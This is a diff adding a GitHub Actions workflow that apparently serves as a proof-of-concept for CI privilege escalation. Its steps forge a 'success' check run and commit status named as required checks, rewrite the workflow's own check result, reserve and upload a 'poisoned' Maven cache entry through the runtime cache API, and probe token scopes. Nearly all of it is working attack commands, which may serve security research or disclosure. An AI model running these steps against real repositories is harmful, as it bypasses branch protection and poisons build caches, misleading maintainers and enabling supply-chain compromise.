@@ -1,0 +1,144 @@
+name: Cache and Checks Escalation Test
+
+on:
+  workflow_dispatch:
+
+permissions:
+  actions: read
+  statuses: write
+  checks: write
+
+jobs:
+  test-escalation:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+
+      - name: Test 1 - Create check run with GITHUB_TOKEN
+        env:
+          GH_TOKEN: ${{ github.token }}
+        run: |
+          echo "=== Creating check run with GITHUB_TOKEN ==="
+          curl -sf -X POST \
+            -H "Authorization: Bearer $GH_TOKEN" \
+            -H "Accept: application/vnd.github+json" \
+            "https://api.github.com/repos/${{ github.repository }}/check-runs" \
+            -d '{
+              "name": "Spoofed Required Check",
+              "head_sha": "${{ github.sha }}",
+              "status": "completed",
+              "conclusion": "success",
+              "output": {
+                "title": "All tests passed",
+                "summary": "This check run was created by attacker-controlled code via checks:write"
+              }
+            }' | tee /tmp/check-run-result.json | jq '{id, name, status, conclusion, app: .app.slug}'
+
+      - name: Test 2 - Update existing workflow check run
+        env:
+          GH_TOKEN: ${{ github.token }}
+        run: |
+          echo "=== Listing current check runs ==="
+          CHECK_RUNS=$(curl -sf \
+            -H "Authorization: Bearer $GH_TOKEN" \
+            -H "Accept: application/vnd.github+json" \
+            "https://api.github.com/repos/${{ github.repository }}/commits/${{ github.sha }}/check-runs")
+          echo "$CHECK_RUNS" | jq '.check_runs[] | {id, name, status, conclusion, app: .app.slug}'
+
+          # Try to update OUR OWN workflow's check run
+          OWN_ID=$(echo "$CHECK_RUNS" | jq -r '.check_runs[] | select(.name == "test-escalation") | .id')
+          echo "Own check run ID: $OWN_ID"
+          if [ -n "$OWN_ID" ]; then
+            echo "=== Attempting to update own check run conclusion ==="
+            curl -sf -X PATCH \
+              -H "Authorization: Bearer $GH_TOKEN" \
+              -H "Accept: application/vnd.github+json" \
+              "https://api.github.com/repos/${{ github.repository }}/check-runs/$OWN_ID" \
+              -d '{"conclusion": "success", "status": "completed"}' | jq '{id, name, status, conclusion}'
+          fi
+
+      - name: Test 3 - Create commit status with arbitrary context
+        env:
+          GH_TOKEN: ${{ github.token }}
+        run: |
+          echo "=== Creating spoofed required status ==="
+          curl -sf -X POST \
+            -H "Authorization: Bearer $GH_TOKEN" \
+            -H "Accept: application/vnd.github+json" \
+            "https://api.github.com/repos/${{ github.repository }}/statuses/${{ github.sha }}" \
+            -d '{
+              "state": "success",
+              "context": "external-ci/required-build",
+              "description": "Spoofed required status check"
+            }' | jq '{id, state, context}'
+
+      - name: Test 4 - Cache API capabilities
+        run: |
+          echo "=== Environment variables for cache ==="
+          echo "ACTIONS_CACHE_URL: ${ACTIONS_CACHE_URL:-NOT SET}"
+          echo "ACTIONS_RUNTIME_URL: ${ACTIONS_RUNTIME_URL:-NOT SET}"
+          echo "ACTIONS_RUNTIME_TOKEN length: ${#ACTIONS_RUNTIME_TOKEN}"
+
+          if [ -n "$ACTIONS_CACHE_URL" ]; then
+            echo "=== Cache service is available ==="
+            # Reserve a cache entry with an arbitrary key
+            echo "=== Reserving cache with arbitrary key ==="
+            RESERVE_RESP=$(curl -sf -X POST \
+              "${ACTIONS_CACHE_URL}_apis/artifactcache/caches" \
+              -H "Authorization: Bearer $ACTIONS_RUNTIME_TOKEN" \
+              -H "Content-Type: application/json" \
+              -d '{
+                "key": "Linux-maven-Maven Central Release-poisoned",
+                "version": "deadbeef"
+              }')
+            echo "Reserve response: $RESERVE_RESP"
+            CACHE_ID=$(echo "$RESERVE_RESP" | jq -r '.cacheId')
+
+            if [ "$CACHE_ID" != "null" ] && [ -n "$CACHE_ID" ]; then
+              echo "=== Cache reserved with ID: $CACHE_ID ==="
+
+              # Upload a small test payload
+              echo "POISONED_CACHE_CONTENT" > /tmp/poison.txt
+              curl -sf -X PATCH \
+                "${ACTIONS_CACHE_URL}_apis/artifactcache/caches/$CACHE_ID" \
+                -H "Authorization: Bearer $ACTIONS_RUNTIME_TOKEN" \
+                -H "Content-Type: application/octet-stream" \
+                -H "Content-Range: bytes 0-21/*" \
+                --data-binary @/tmp/poison.txt
+              echo "Upload result: $?"
+
+              # Finalize
+              curl -sf -X POST \
+                "${ACTIONS_CACHE_URL}_apis/artifactcache/caches/$CACHE_ID" \
+                -H "Authorization: Bearer $ACTIONS_RUNTIME_TOKEN" \
+                -H "Content-Type: application/json" \
+                -d "{\"size\": 22}"
+              echo "Finalize result: $?"
+
+              echo "=== SUCCESS: Arbitrary cache key saved ==="
+            else
+              echo "=== Cache reservation failed (key may exist) ==="
+              echo "Response: $RESERVE_RESP"
+            fi
+
+            # Now try to list/query caches
+            echo "=== Querying cache entries ==="
+            curl -sf "${ACTIONS_CACHE_URL}_apis/artifactcache/cache?keys=Linux-maven&version=deadbeef" \
+              -H "Authorization: Bearer $ACTIONS_RUNTIME_TOKEN" | jq .
+          else
+            echo "=== No cache URL available, trying ACTIONS_RUNTIME_URL ==="
+            if [ -n "$ACTIONS_RUNTIME_URL" ]; then
+              echo "Runtime URL available, cache may work via runtime"
+            fi
+          fi
+
+      - name: Test 5 - Enumerate available tokens
+        run: |
+          echo "=== GITHUB_TOKEN permissions ==="
+          curl -sf -H "Authorization: Bearer ${{ github.token }}" \
+            https://api.github.com/repos/${{ github.repository }} \
+            -I 2>&1 | grep -i "x-oauth-scopes\|x-accepted-oauth-scopes\|x-ratelimit"
+
+          echo "=== Token info ==="
+          curl -sf -H "Authorization: Bearer ${{ github.token }}" \
+            https://api.github.com/repos/${{ github.repository }}/actions/permissions 2>&1 | head -5 || true
